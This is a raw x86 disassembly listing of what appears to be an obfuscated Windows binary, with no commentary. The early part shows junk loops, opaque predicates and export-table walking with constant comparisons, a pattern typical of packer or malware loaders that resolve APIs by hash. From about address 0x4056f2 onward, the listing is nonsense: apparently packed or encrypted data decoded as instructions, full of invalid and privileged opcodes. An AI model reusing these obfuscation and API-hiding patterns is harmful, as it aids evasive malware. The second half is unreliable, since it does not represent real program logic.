  4052d8:	cmp    DWORD PTR ds:0x42b010,0x4
  4052df:	jne    0x4052f4
  4052e5:	push   DWORD PTR [ebp-0x1c]
  4052e8:	push   DWORD PTR [ebp-0x20]
  4052eb:	push   DWORD PTR [ebp-0xc]
  4052ee:	call   DWORD PTR ds:0x42ed41
  4052f4:	cmp    DWORD PTR ds:0x42b010,0x3
  4052fb:	jne    0x40530e
  405301:	mov    esi,DWORD PTR ds:0x42b010
  405307:	inc    esi
  405308:	mov    DWORD PTR ds:0x42b010,esi
  40530e:	jmp    0x4052be
  405313:	mov    ecx,DWORD PTR [ebp-0x14]
  405316:	xor    ecx,ebx
  405318:	add    ecx,eax
  40531a:	and    DWORD PTR ds:0x42a00c,0x4b6f
  405324:	mov    DWORD PTR [ebp-0x24],ecx
  405327:	mov    DWORD PTR ds:0x429024,0x1f
  405331:	cmp    DWORD PTR ds:0x429024,0x0
  405338:	je     0x405390
  40533e:	cmp    DWORD PTR ds:0x429024,0x6
  405345:	jne    0x40535e
  40534b:	push   0x5506
  405350:	push   0x42b000
  405355:	push   DWORD PTR [ebp-0x28]
  405358:	call   DWORD PTR ds:0x42ed45
  40535e:	cmp    DWORD PTR ds:0x429024,0x7
  405365:	jne    0x405378
  40536b:	mov    ecx,DWORD PTR ds:0x429024
  405371:	dec    ecx
  405372:	mov    DWORD PTR ds:0x429024,ecx
  405378:	mov    ecx,DWORD PTR ds:0x429024
  40537e:	dec    ecx
  40537f:	mov    DWORD PTR ds:0x429024,ecx
  405385:	jmp    0x405331
  40538a:	or     DWORD PTR ds:0x42a004,ebx
  405390:	mov    ecx,DWORD PTR [ebp-0x4]
  405393:	xor    ecx,ebx
  405395:	add    ecx,eax
  405397:	sub    esi,0x6631
  40539d:	mov    DWORD PTR [ebp-0x30],ecx
  4053a0:	dec    esi
  4053a1:	mov    esi,DWORD PTR [ebp-0x4]
  4053a4:	and    DWORD PTR ds:0x42d01c,0x0
  4053ae:	jmp    0x4053c2
  4053b3:	xor    ecx,ecx
  4053b5:	or     ecx,DWORD PTR ds:0x42d01c
  4053bb:	inc    ecx
  4053bc:	mov    DWORD PTR ds:0x42d01c,ecx
  4053c2:	cmp    DWORD PTR ds:0x42d01c,0x1e
  4053c9:	jae    0x405407
  4053cf:	cmp    DWORD PTR ds:0x42d01c,0xe
  4053d6:	jne    0x4053e2
  4053dc:	call   DWORD PTR ds:0x42ed51
  4053e2:	cmp    DWORD PTR ds:0x42d01c,0xd
  4053e9:	jne    0x4053fc
  4053ef:	mov    ecx,DWORD PTR ds:0x42d01c
  4053f5:	inc    ecx
  4053f6:	mov    DWORD PTR ds:0x42d01c,ecx
  4053fc:	jmp    0x4053b3
  405401:	or     ecx,DWORD PTR ds:0x42a000
  405407:	xor    esi,ebx
  405409:	dec    ecx
  40540a:	add    esi,eax
  40540c:	mov    ecx,DWORD PTR [ebp-0x24]
  40540f:	and    DWORD PTR ds:0x429000,0x42c018
  405419:	sub    ecx,eax
  40541b:	or     DWORD PTR ds:0x42b014,0x429024
  405425:	lea    edx,[esi-0x3272dd]
  40542b:	add    DWORD PTR ds:0x42d008,0x42a004
  405435:	xor    ecx,ebx
  405437:	adc    DWORD PTR ds:0x42d018,0x3588
  405441:	xor    edx,ebx
  405443:	cmp    edx,ecx
  405445:	je     0x4056db
  40544b:	mov    ecx,DWORD PTR [ebp-0x4]
  40544e:	or     DWORD PTR ds:0x42a004,0x7d41
  405458:	xor    ecx,ebx
  40545a:	sbb    DWORD PTR ds:0x42c004,0x1a4b
  405464:	add    ecx,eax
  405466:	cmp    esi,ecx
  405468:	mov    DWORD PTR ds:0x429018,0x444d
  405472:	jne    0x4056b8
  405478:	and    DWORD PTR ds:0x42b004,0x273e
  405482:	push   DWORD PTR [ebp+0x8]
  405485:	add    DWORD PTR ds:0x42d01c,0x42c004
  40548f:	call   0x404fa3
  405494:	mov    DWORD PTR [ebp-0x18],eax
  405497:	sub    ecx,ecx
  405499:	mov    eax,DWORD PTR [ebp-0x4]
  40549c:	and    DWORD PTR ds:0x42d010,0x0
  4054a6:	jmp    0x4054b8
  4054ab:	mov    edi,DWORD PTR ds:0x42d010
  4054b1:	inc    edi
  4054b2:	mov    DWORD PTR ds:0x42d010,edi
  4054b8:	cmp    DWORD PTR ds:0x42d010,0x1b
  4054bf:	jae    0x40557c
  4054c5:	cmp    DWORD PTR ds:0x42d010,0x10
  4054cc:	jne    0x4054d8
  4054d2:	call   DWORD PTR ds:0x42ed55
  4054d8:	cmp    DWORD PTR ds:0x42d010,0xf
  4054df:	jne    0x4054f2
  4054e5:	mov    edi,DWORD PTR ds:0x42d010
  4054eb:	inc    edi
  4054ec:	mov    DWORD PTR ds:0x42d010,edi
  4054f2:	jmp    0x4054ab
  4054f7:	mov    DWORD PTR ds:0x42c00c,0x1c
  405501:	cmp    DWORD PTR ds:0x42c00c,0x0
  405508:	je     0x40557c
  40550e:	cmp    DWORD PTR ds:0x42c00c,0x4
  405515:	jne    0x405544
  40551b:	push   0x213d
  405520:	push   0x2583
  405525:	push   0x42d000
  40552a:	push   0x5f61
  40552f:	push   0x589a
  405534:	push   0x1da2
  405539:	push   0x4b46
  40553e:	call   DWORD PTR ds:0x42ed59
  405544:	cmp    DWORD PTR ds:0x42c00c,0x5
  40554b:	jne    0x40555e
  405551:	mov    edi,DWORD PTR ds:0x42c00c
  405557:	dec    edi
  405558:	mov    DWORD PTR ds:0x42c00c,edi
  40555e:	xor    edi,edi
  405560:	add    edi,DWORD PTR ds:0x42c00c
  405566:	dec    edi
  405567:	mov    DWORD PTR ds:0x42c00c,edi
  40556d:	jmp    0x405501
  405572:	adc    DWORD PTR ds:0x42c004,0x62a8
  40557c:	mov    ecx,DWORD PTR [ebp-0x18]
  40557f:	dec    edi
  405580:	xor    eax,ebx
  405582:	sub    edi,0x56bd
  405588:	mov    edi,0x3272dd
  40558d:	mov    DWORD PTR ds:0x42d00c,0x2303
  405597:	add    eax,edi
  405599:	mov    DWORD PTR ds:0x42a00c,0x3ae7
  4055a3:	cmp    ecx,eax
  4055a5:	mov    DWORD PTR ds:0x42d018,0x39c7
  4055af:	je     0x407aa3
  4055b5:	add    DWORD PTR ds:0x42b004,0x7234
  4055bf:	push   DWORD PTR [ebp-0x18]
  4055c2:	push   DWORD PTR [ebp+0x8]
  4055c5:	call   0x40cc1e
  4055ca:	mov    ecx,DWORD PTR ds:0x42b01c
  4055d0:	sub    DWORD PTR ds:0x42a010,ecx
  4055d6:	mov    DWORD PTR [ebp-0x18],eax
  4055d9:	mov    eax,DWORD PTR [ebp-0x4]
  4055dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4055df:	mov    DWORD PTR ds:0x429000,0x7fe2
  4055e9:	xor    eax,ebx
  4055eb:	or     DWORD PTR ds:0x42a01c,0x42c010
  4055f5:	add    eax,edi
  4055f7:	mov    DWORD PTR ds:0x42b010,0x7af8
  405601:	cmp    ecx,eax
  405603:	mov    DWORD PTR ds:0x429014,0x1a63
  40560d:	je     0x407aa3
  405613:	mov    eax,ds:0x411f6c
  405618:	mov    ecx,DWORD PTR ds:0x411f84
  40561e:	sub    eax,ecx
  405620:	sub    eax,DWORD PTR [eax+ecx*1]
  405623:	mov    eax,DWORD PTR [ebp-0x18]
  405626:	mov    eax,DWORD PTR [eax+0x18]
  405629:	mov    DWORD PTR [ebp-0x24],eax
  40562c:	and    DWORD PTR ds:0x429028,edi
  405632:	mov    eax,DWORD PTR [ebp-0x18]
  405635:	and    DWORD PTR ds:0x429014,0x0
  40563f:	xor    ecx,ecx
  405641:	xor    ecx,DWORD PTR ds:0x429014
  405647:	inc    ecx
  405648:	mov    DWORD PTR ds:0x429014,ecx
  40564e:	cmp    DWORD PTR ds:0x429014,0xa
  405655:	jne    0x405669
  40565b:	push   DWORD PTR [ebp-0xc]
  40565e:	push   0x42e0a1
  405663:	call   DWORD PTR ds:0x42ed5d
  405669:	cmp    DWORD PTR ds:0x429014,0x9
  405670:	jne    0x405683
  405676:	mov    ecx,DWORD PTR ds:0x429014
  40567c:	inc    ecx
  40567d:	mov    DWORD PTR ds:0x429014,ecx
  405683:	cmp    DWORD PTR ds:0x429014,0x1c
  40568a:	jb     0x40563f
  405690:	mov    ecx,DWORD PTR [ebp+0x8]
  405693:	add    ecx,DWORD PTR [eax+0x20]
  405696:	mov    DWORD PTR [ebp-0x2c],ecx
  405699:	mov    eax,DWORD PTR [ebp-0x18]
  40569c:	mov    ecx,DWORD PTR [ebp+0x8]
  40569f:	add    ecx,DWORD PTR [eax+0x24]
  4056a2:	mov    DWORD PTR [ebp-0x34],ecx
  4056a5:	mov    eax,DWORD PTR [ebp-0x18]
  4056a8:	mov    ecx,DWORD PTR [ebp+0x8]
  4056ab:	add    ecx,DWORD PTR [eax+0x1c]
  4056ae:	mov    eax,edi
  4056b0:	mov    DWORD PTR [ebp-0x18],ecx
  4056b3:	jmp    0x407a6b
  4056b8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4056bb:	mov    edx,DWORD PTR [ebp+0x8]
  4056be:	add    edx,DWORD PTR [ecx+esi*4]
  4056c1:	mov    DWORD PTR [ebp-0x28],edx
  4056c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056c7:	mov    edx,DWORD PTR [ebp-0x28]
  4056ca:	xor    ecx,ebx
  4056cc:	add    ecx,eax
  4056ce:	cmp    edx,ecx
  4056d0:	je     0x407a6b
  4056d6:	jmp    0x407a57
  4056db:	mov    ecx,DWORD PTR [ebp-0x4]
  4056de:	mov    edx,DWORD PTR [ebp-0x8]
  4056e1:	xor    ecx,ebx
  4056e3:	add    ecx,eax
  4056e5:	cmp    edx,ecx
  4056e7:	je     0x407aaf
  4056ed:	jmp    0x407a45
  4056f2:	or     al,0xd7
  4056f4:	xchg   ebp,eax
  4056f5:	loop   0x40576c
  4056f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f8:	emms   
  4056fa:	adc    dl,BYTE PTR ds:0x60eff58a
  405700:	add    esi,DWORD PTR [ebp-0x29]
  405703:	pop    edi
  405704:	jp     0x405780
  405706:	aaa    
  405707:	pop    edi
  405708:	jp     0x405784
  40570a:	sti    
  40570b:	jnp    0x4056e6
  40570d:	xor    BYTE PTR [esi+0x3d],bh
  405710:	jo     0x40573a
  405712:	mul    DWORD PTR [esi-0x5947a42c]
  405718:	int3   
  405719:	bound  edx,QWORD PTR [ecx-0x2e]
  40571c:	xchg   esp,eax
  40571d:	std    
  40571e:	clc    
  40571f:	adc    esi,ebp
  405721:	xchg   ebx,eax
  405722:	not    DWORD PTR [ecx]
  405724:	push   es
  405725:	cmc    
  405726:	outs   dx,BYTE PTR ds:[esi]
  405727:	imul   ebp,ebp,0x82e3dd27
  40572d:	scas   al,BYTE PTR es:[edi]
  40572e:	ja     0x4057ac
  405730:	js     0x40578e
  405732:	hlt    
  405733:	push   ebp
  405734:	push   edx
  405735:	jle    0x405718
  405737:	les    ebp,FWORD PTR [edi+eiz*8-0x32]
  40573b:	lods   eax,DWORD PTR ds:[esi]
  40573c:	jg     0x405751
  40573e:	arpl   WORD PTR [edx-0x21],dx
  405741:	jns    0x40577f
  405743:	outs   dx,DWORD PTR ds:[esi]
  405744:	cmp    ebx,DWORD PTR [ecx]
  405746:	stos   DWORD PTR es:[edi],eax
  405747:	(bad)  
  405748:	scas   al,BYTE PTR es:[edi]
  405749:	ret    
  40574a:	pop    esi
  40574b:	jle    0x4057b8
  40574d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40574e:	push   0x6e011b5a
  405753:	outs   dx,BYTE PTR ds:[esi]
  405754:	cmp    esi,DWORD PTR [edx]
  405756:	mov    ah,0xe3
  405758:	or     BYTE PTR [ecx],dl
  40575a:	push   esi
  40575b:	adc    BYTE PTR [eax-0x4],dl
  40575e:	dec    ebx
  40575f:	(bad)  
  405760:	rcr    BYTE PTR [ecx-0x49c8eaf4],1
  405766:	mov    eax,ds:0xf1921efa
  40576b:	xchg   esp,eax
  40576c:	cmc    
  40576d:	icebp  
  40576e:	outs   dx,BYTE PTR ds:[esi]
  40576f:	stos   BYTE PTR es:[edi],al
  405770:	mov    dl,0xe9
  405772:	imul   edx,DWORD PTR [edi-0x40993d12],0xc306809
  40577c:	inc    esp
  40577d:	ss inc esi
  405780:	mov    al,0xeb
  405782:	dec    ecx
  405783:	add    al,0x6a
  405785:	(bad)  [edi+0x66c87c47]
  40578b:	popf   
  40578c:	pop    edi
  40578d:	or     esi,DWORD PTR [edi-0xd]
  405790:	popf   
  405791:	sar    bh,0x5e
  405794:	sbb    al,0xd3
  405796:	pop    ss
  405797:	inc    ecx
  405798:	inc    edx
  405799:	xor    BYTE PTR [ebx],0xa
  40579c:	xchg   esp,eax
  40579d:	jnp    0x4057ab
  40579f:	cmp    edi,0xab81de01
  4057a5:	mov    cl,0xd1
  4057a7:	fsub   st,st(5)
  4057a9:	test   BYTE PTR [ecx+0x26d58e2f],dl
  4057af:	or     DWORD PTR [edi],edi
  4057b1:	cwde   
  4057b2:	dec    ecx
  4057b3:	fdiv   QWORD PTR [eax+0x6d0c29ec]
  4057b9:	imul   esi,edi,0x6fc3eda0
  4057bf:	add    BYTE PTR [ebx-0x674f0aaf],dl
  4057c5:	mov    dh,0xd8
  4057c7:	cmp    esi,DWORD PTR [edx]
  4057c9:	enter  0xebbb,0x19
  4057cd:	lods   eax,DWORD PTR ds:[esi]
  4057ce:	push   ss
  4057cf:	fs clc 
  4057d1:	into   
  4057d2:	sbb    DWORD PTR [ebx-0x3fee7499],edx
  4057d8:	rol    DWORD PTR [edi+0x55baf1bc],0xd0
  4057df:	mov    eax,0x25cb0fcf
  4057e4:	fdiv   DWORD PTR [edi-0x19]
  4057e7:	mov    dl,0xc0
  4057e9:	push   ebp
  4057ea:	jae    0x4057c6
  4057ec:	add    DWORD PTR [esi+0x51d1261b],esi
  4057f2:	and    DWORD PTR ds:0x86cc81e3,edi
  4057f8:	push   0x2234d33a
  4057fd:	dec    ebx
  4057fe:	in     al,dx
  4057ff:	pop    edx
  405800:	xor    cl,BYTE PTR [ebx-0x36]
  405803:	retf   
  405804:	in     eax,dx
  405805:	daa    
  405806:	sbb    cl,ch
  405808:	cs adc ebp,edx
  40580b:	fdiv   st,st(1)
  40580d:	hlt    
  40580e:	out    0x44,eax
  405810:	xchg   ebx,eax
  405811:	xor    eax,0xe44cfa35
  405816:	inc    edi
  405817:	arpl   WORD PTR [ebp-0x52035d1d],si
  40581d:	fmul   QWORD PTR [esi+0x43abccb3]
  405823:	pop    esp
  405824:	jb     0x40586b
  405826:	sub    eax,0x9d7cfaf4
  40582b:	mov    bl,0xd7
  40582d:	xchg   ebp,eax
  40582e:	ret    
  40582f:	test   BYTE PTR [edi],dl
  405831:	test   DWORD PTR [ebx-0x19],edi
  405834:	adc    DWORD PTR [ecx+0x6e],esi
  405837:	sbb    BYTE PTR [ebp-0x519735b3],dl
  40583d:	popf   
  40583e:	test   DWORD PTR cs:[esi],ebp
  405841:	stos   BYTE PTR es:[edi],al
  405842:	pop    eax
  405843:	ret    
  405844:	push   cs
  405845:	mov    bl,BYTE PTR [ebx+ebx*1-0x3c274356]
  40584c:	lds    eax,FWORD PTR [ebp-0x79a60bc0]
  405852:	out    0x65,eax
  405854:	popa   
  405855:	fcmovbe st,st(1)
  405857:	push   0x0
  405859:	or     ch,ch
  40585b:	loope  0x405873
  40585d:	rol    BYTE PTR [eax],1
  40585f:	lahf   
  405860:	sub    eax,ebp
  405862:	daa    
  405863:	test   eax,0x9ac875a5
  405868:	push   ebp
  405869:	leave  
  40586a:	push   ds
  40586b:	xchg   edx,eax
  40586c:	adc    eax,0xe6fc0c0b
  405871:	push   0x3b
  405873:	adc    DWORD PTR [ecx+0x6b],edi
  405876:	push   esi
  405877:	sub    eax,0x33f74b8c
  40587c:	(bad)  
  40587d:	popf   
  40587e:	xchg   edi,eax
  40587f:	push   esi
  405880:	and    DWORD PTR [ebx+0x28e0369b],ecx
  405886:	dec    ebx
  405887:	iret   
  405888:	test   eax,0x88e9ba64
  40588d:	retf   
  40588e:	into   
  40588f:	and    edx,DWORD PTR [esi]
  405891:	mov    eax,0xebc0a2b2
  405896:	scas   eax,DWORD PTR es:[edi]
  405897:	cs mov cl,0xae
  40589a:	sahf   
  40589b:	jo     0x4058d5
  40589d:	mov    cl,0x6e
  40589f:	jmp    0x26fe:0x7a6eba3
  4058a6:	xchg   esi,eax
  4058a7:	call   0xc0cba59c
  4058ac:	popf   
  4058ad:	imul   ebx,DWORD PTR [edi],0xdbb5100e
  4058b3:	pop    esp
  4058b4:	adc    bl,bh
  4058b6:	(bad)  
  4058b7:	retf   
  4058b8:	loopne 0x405935
  4058ba:	pop    ebp
  4058bb:	or     eax,0xfa958012
  4058c0:	push   es
  4058c1:	out    dx,eax
  4058c2:	ins    DWORD PTR es:[edi],dx
  4058c3:	out    dx,eax
  4058c4:	or     BYTE PTR ds:0x520cdd40,ch
  4058ca:	sub    eax,DWORD PTR [ebx-0x393ae064]
  4058d0:	mov    dl,0x5c
  4058d2:	sbb    DWORD PTR [ebx-0x43cb6991],0xf26d0d8b
  4058dc:	pop    eax
  4058dd:	add    eax,DWORD PTR [eax+esi*4-0x3bd1479d]
  4058e4:	mov    esi,0x79f62cf6
  4058e9:	shr    DWORD PTR [ecx-0x68],cl
  4058ec:	shl    eax,cl
  4058ee:	sub    BYTE PTR [esi+ebp*4+0x54],ch
  4058f2:	test   BYTE PTR [ecx],cl
  4058f4:	fstp   DWORD PTR [eax]
  4058f6:	cmp    dh,BYTE PTR [ebx-0x48]
  4058f9:	sub    DWORD PTR [ebp+eiz*2+0x62],edi
  4058fd:	push   edi
  4058fe:	hlt    
  4058ff:	add    al,0x70
  405901:	push   edx
  405902:	adc    DWORD PTR [eax],ecx
  405904:	gs call 0x6f8d196c
  40590a:	mov    edx,0xb08c48e4
  40590f:	sti    
  405910:	scas   eax,DWORD PTR es:[edi]
  405911:	push   ds
  405912:	div    DWORD PTR [edi+0x67]
  405915:	sahf   
  405916:	je     0x405972
  405918:	in     eax,dx
  405919:	push   esi
  40591a:	xor    BYTE PTR [ecx-0x1bcd415f],dl
  405920:	pop    ebp
  405921:	clc    
  405922:	lock retf 0xd96f
  405926:	and    BYTE PTR [edi-0x7e],dl
  405929:	int3   
  40592a:	pop    esi
  40592b:	mov    edx,0x26700140
  405930:	mov    ah,0xd
  405932:	in     al,dx
  405933:	xchg   ebp,eax
  405934:	into   
  405935:	jle    0x4058ed
  405937:	cmp    DWORD PTR [ebx-0x4],eax
  40593a:	push   ecx
  40593b:	inc    ebp
  40593c:	jmp    DWORD PTR [esi-0x5bbe0f49]
  405942:	or     eax,0xe74062ca
  405947:	inc    ecx
  405948:	sbb    DWORD PTR [eax-0x5bff0863],eax
  40594e:	shl    BYTE PTR [eax],0xa1
  405951:	jge    0x40597b
  405953:	xchg   esi,eax
  405954:	and    edi,esi
  405956:	stc    
  405957:	mov    ebx,0xaca36081
  40595c:	idiv   BYTE PTR [ecx-0x18]
  40595f:	inc    esi
  405960:	std    
  405961:	out    dx,al
  405962:	test   DWORD PTR [edi],ebp
  405964:	and    ch,BYTE PTR [edx-0x1d]
  405967:	test   eax,0x83db185d
  40596c:	call   0xf790fe94
  405971:	in     eax,dx
  405972:	cmc    
  405973:	or     al,0x61
  405975:	jl     0x405983
  405977:	in     al,dx
  405978:	adc    al,0x71
  40597a:	stos   DWORD PTR es:[edi],eax
  40597b:	es dec edi
  40597d:	sub    eax,0x1aa4e18a
  405982:	dec    ebp
  405983:	push   ebp
  405984:	cmp    DWORD PTR [eax],ebp
  405986:	in     al,0xdf
  405988:	daa    
  405989:	push   0x77
  40598b:	dec    ecx
  40598c:	das    
  40598d:	add    al,BYTE PTR [ebx+eax*2-0x48]
  405991:	int3   
  405992:	mov    al,ds:0x350e9014
  405997:	bswap  edx
  405999:	(bad)  
  40599a:	pop    esp
  40599b:	and    edx,DWORD PTR ds:0x9a18f4dd
  4059a1:	adc    BYTE PTR [ebp-0x5c1ebc5f],dl
  4059a7:	jge    0x4059f3
  4059a9:	scas   al,BYTE PTR es:[edi]
  4059aa:	dec    edx
  4059ab:	stc    
  4059ac:	mov    esp,0xfb2787b2
  4059b1:	ret    0xab6a
  4059b4:	stc    
  4059b5:	push   edx
  4059b6:	scas   eax,DWORD PTR es:[edi]
  4059b7:	fcomp  QWORD PTR [edi-0x6d]
  4059ba:	test   eax,0x8f39a7a7
  4059bf:	stos   WORD PTR es:[edi],ax
  4059c1:	mov    edi,0x7a3be633
  4059c6:	xlat   BYTE PTR ds:[ebx]
  4059c7:	mov    ah,0x12
  4059c9:	mov    dh,0xc9
  4059cb:	stc    
  4059cc:	xchg   edi,eax
  4059cd:	aas    
  4059ce:	or     al,0x52
  4059d0:	xor    BYTE PTR [edx-0x73],dh
  4059d3:	jmp    0x588d8a27
  4059d8:	stos   BYTE PTR es:[edi],al
  4059d9:	lods   eax,DWORD PTR ds:[esi]
  4059da:	test   ebp,esp
  4059dc:	and    eax,DWORD PTR [ebx]
  4059de:	lods   al,BYTE PTR ds:[esi]
  4059df:	inc    esp
  4059e0:	rol    BYTE PTR [edx+edx*2],cl
  4059e3:	and    al,0x41
  4059e5:	sar    DWORD PTR [esi],cl
  4059e7:	and    DWORD PTR [eax-0x7f],edx
  4059ea:	dec    esp
  4059eb:	aas    
  4059ec:	xor    edi,DWORD PTR [ecx+0x3a4427bd]
  4059f2:	(bad)
  4059f6:	fild   QWORD PTR [edx+ebp*2-0x39]
  4059fa:	imul   esi,esi,0xffffffec
  4059fd:	out    dx,eax
  4059fe:	xchg   edi,eax
  4059ff:	cmp    BYTE PTR [edi],ah
  405a01:	cli    
  405a02:	or     BYTE PTR gs:[ecx-0x1d],dl
  405a06:	jl     0x405a2e
  405a08:	lods   al,BYTE PTR ds:[esi]
  405a09:	pop    edi
  405a0a:	stos   BYTE PTR es:[edi],al
  405a0b:	xchg   ebx,eax
  405a0c:	call   0xbddc0d1
  405a11:	mov    edi,0x1b25cee4
  405a16:	js     0x405a2e
  405a18:	lea    edx,ds:0xc7ff29e1
  405a1e:	data16 std 
  405a20:	rcl    BYTE PTR [esi-0x7b7f0246],cl
  405a26:	cmc    
  405a27:	cmp    BYTE PTR [eax-0x44],dl
  405a2a:	push   edi
  405a2b:	inc    edi
  405a2c:	mov    bl,0x65
  405a2e:	in     eax,0x3c
  405a30:	addr16 push edx
  405a32:	imul   esi,DWORD PTR [eax-0x17],0xe
  405a36:	(bad)  
  405a37:	aad    0xf8
  405a39:	pop    esp
  405a3a:	inc    edi
  405a3b:	xchg   ebx,eax
  405a3c:	cmp    al,0x22
  405a3e:	push   esi
  405a3f:	sub    eax,0x40a28e03
  405a44:	mov    ds:0xccce8660,al
  405a49:	addr16 dec edi
  405a4b:	mov    dl,0xe0
  405a4d:	dec    ebx
  405a4e:	sub    BYTE PTR [esi+0x3d],dl
  405a51:	mov    esp,0xde6dee8
  405a56:	xchg   edi,eax
  405a57:	push   ebx
  405a58:	xchg   esp,esi
  405a5a:	cmp    DWORD PTR [edi-0x6c80895f],edi
  405a60:	sbb    DWORD PTR [ebx+edi*2-0x60ec8c87],eax
  405a67:	ins    BYTE PTR es:[edi],dx
  405a68:	rcr    DWORD PTR [esp+edx*1],cl
  405a6b:	leave  
  405a6c:	sahf   
  405a6d:	(bad)  
  405a6f:	call   0x33b0eef3
  405a74:	push   sp
  405a76:	pop    edi
  405a77:	mov    eax,ds:0x9911901e
  405a7c:	lods   al,BYTE PTR ds:[esi]
  405a7d:	aaa    
  405a7e:	inc    ecx
  405a7f:	mov    esi,0x48ff009f
  405a84:	adc    ebx,DWORD PTR [esp+edx*4-0x5]
  405a88:	sbb    eax,0x2c30478
  405a8d:	push   ecx
  405a8e:	sbb    edi,DWORD PTR [eax-0x7af81782]
  405a94:	xor    eax,0x70c9f01f
  405a99:	mov    BYTE PTR [ebp-0x71],al
  405a9c:	cmp    dl,BYTE PTR [ebp-0x14]
  405a9f:	xchg   edx,eax
  405aa0:	lods   eax,DWORD PTR ds:[esi]
  405aa1:	leave  
  405aa2:	push   esi
  405aa3:	stc    
  405aa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aa5:	jecxz  0x405aa0
  405aa7:	retf   
  405aa8:	into   
  405aa9:	jo     0x405a47
  405aab:	sbb    ecx,DWORD PTR [ecx+0x6f]
  405aae:	sub    al,0xbc
  405ab0:	test   al,0x5b
  405ab2:	mov    al,ds:0x74615946
  405ab7:	loopne 0x405b2f
  405ab9:	adc    bl,bl
  405abb:	lock dec edi
  405abd:	ds retf 
  405abf:	sbb    esi,0xffffffda
  405ac2:	ror    edi,cl
  405ac4:	gs mov edi,0x85c6a3ae
  405aca:	cdq    
  405acb:	sbb    bl,BYTE PTR [ebx-0x405862d7]
  405ad1:	sbb    ebx,edi
  405ad3:	loop   0x405af8
  405ad5:	and    ebp,ebp
  405ad7:	stc    
  405ad8:	push   es
  405ad9:	ret    
  405ada:	(bad)  
  405adc:	loop   0x405adf
  405ade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405adf:	mov    ebx,0x887a3258
  405ae4:	ins    BYTE PTR es:[edi],dx
  405ae5:	cdq    
  405ae6:	fcom   DWORD PTR fs:[ebp-0x79]
  405aea:	xor    eax,0xfdab3eb7
  405aef:	dec    esi
  405af0:	dec    eax
  405af1:	sub    DWORD PTR [esi],esp
  405af3:	loop   0x405a88
  405af5:	leave  
  405af6:	jbe    0x405acc
  405af8:	inc    ebx
  405af9:	jg     0x405af5
  405afb:	mov    BYTE PTR [ecx+0x20],ch
  405afe:	retf   0x56bb
  405b01:	pop    ebp
  405b02:	jne    0x405a9a
  405b04:	sub    eax,0xff084d3b
  405b09:	je     0x405b77
  405b0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b0c:	(bad)  
  405b0d:	cli    
  405b0e:	xor    ah,dl
  405b10:	mov    cl,0x96
  405b12:	inc    esp
  405b13:	push   edi
  405b14:	mov    ah,0xd4
  405b16:	fisttp DWORD PTR [esi-0x67]
  405b19:	mov    cl,0xb
  405b1b:	add    eax,DWORD PTR [edi-0x7a]
  405b1e:	pushf  
  405b1f:	pop    ebx
  405b20:	mov    esp,0xd2d80c33
  405b25:	add    ebx,DWORD PTR [eax+0x4be19e99]
  405b2b:	js     0x405b86
  405b2d:	nop
  405b2e:	push   edi
  405b2f:	jb     0x405b71
  405b31:	jg     0x405ad7
  405b33:	sub    eax,ecx
  405b35:	xor    BYTE PTR fs:[esi],cl
  405b38:	(bad)  
  405b39:	fdiv   QWORD PTR [esi+0x15]
  405b3c:	(bad)  
  405b3d:	outs   dx,DWORD PTR ds:[esi]
  405b3e:	xor    eax,0x91b59deb
  405b43:	cmp    BYTE PTR fs:[ebx],0x45
  405b47:	sti    
  405b48:	mov    ?,WORD PTR gs:[edx]
  405b4b:	imul   eax,DWORD PTR [ebx*2+0x137cbeb2],0x85cf773d
  405b56:	aaa    
  405b57:	(bad)  
  405b58:	push   ebp
  405b59:	and    esi,ecx
  405b5b:	sub    eax,0xd19dad90
  405b60:	cld    
  405b61:	push   esi
  405b62:	adc    al,BYTE PTR [eax+eax*1]
  405b65:	jns    0x405b9f
  405b67:	test   DWORD PTR [ebx+eiz*8],ecx
  405b6a:	lds    eax,FWORD PTR [edi+0x4d248b49]
  405b70:	dec    edx
  405b71:	clc    
  405b72:	xchg   esi,eax
  405b73:	or     BYTE PTR [ebx],0xee
  405b76:	dec    eax
  405b77:	jle    0x405b4d
  405b79:	sub    eax,0x7a5ccdc2
  405b7e:	retf   0x453a
  405b81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b82:	mov    al,0x5e
  405b84:	inc    ebp
  405b85:	cmp    al,0x58
  405b87:	out    0x8d,al
  405b89:	jg     0x405bf8
  405b8b:	mov    al,ds:0xf9b04dda
  405b90:	leave  
  405b91:	dec    esi
  405b92:	stc    
  405b93:	mov    esi,0xd1464f6b
  405b98:	icebp  
  405b99:	jns    0x405b28
  405b9b:	sbb    eax,eax
  405b9d:	imul   eax,DWORD PTR [edi-0x4d],0x55
  405ba1:	jecxz  0x405b92
  405ba3:	add    eax,0xea876da1
  405ba8:	xchg   ebp,eax
  405ba9:	pop    esp
  405baa:	pop    ecx
  405bab:	out    0x5a,al
  405bad:	jmp    0x405c11
  405baf:	mov    bl,0x3e
  405bb1:	stos   BYTE PTR es:[edi],al
  405bb2:	inc    edi
  405bb3:	xor    DWORD PTR ds:0xa22af9b,ebp
  405bb9:	popa   
  405bba:	clc    
  405bbb:	or     dh,ah
  405bbd:	jl     0x405be3
  405bbf:	call   0x9c3f:0xf2f5e203
  405bc6:	xchg   ebx,eax
  405bc7:	xor    DWORD PTR [edi-0x421c91de],0xbe7e3282
  405bd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bd3:	aaa    
  405bd4:	add    ebx,DWORD PTR [ebx]
  405bd6:	fstp   DWORD PTR [edx-0x43611900]
  405bdc:	pushf  
  405bdd:	jecxz  0x405c1b
  405bdf:	sbb    BYTE PTR [ebp-0x73aee4c9],ch
  405be5:	mov    fs:0x6f3629bc,al
  405beb:	mov    al,ds:0x48849737
  405bf0:	pop    ebp
  405bf1:	adc    DWORD PTR [ecx+edi*4],ecx
  405bf4:	push   edx
  405bf5:	in     eax,0x6e
  405bf7:	dec    esp
  405bf8:	sbb    BYTE PTR [esi-0x6071516a],ah
  405bfe:	push   ebp
  405bff:	cs (bad) 
  405c02:	rcl    BYTE PTR [eax*8+0x5849a70f],1
  405c09:	jb     0x405bfc
